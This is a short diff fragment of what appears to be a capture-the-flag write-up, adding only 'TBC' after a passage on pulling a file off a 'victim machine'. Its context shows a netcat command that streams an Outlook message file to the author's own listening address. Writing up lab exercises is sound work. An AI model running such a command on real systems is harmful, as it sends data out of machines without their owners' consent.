@@ -170,3 +170,5 @@ So, I used `netcat` to transfer the file from the victim machine to my machine.
 ```
 nc  10.10.14.8 10000 < Windows\ Event\ Logs\ for\ Analysis.msg 
 ```
+
+TBC
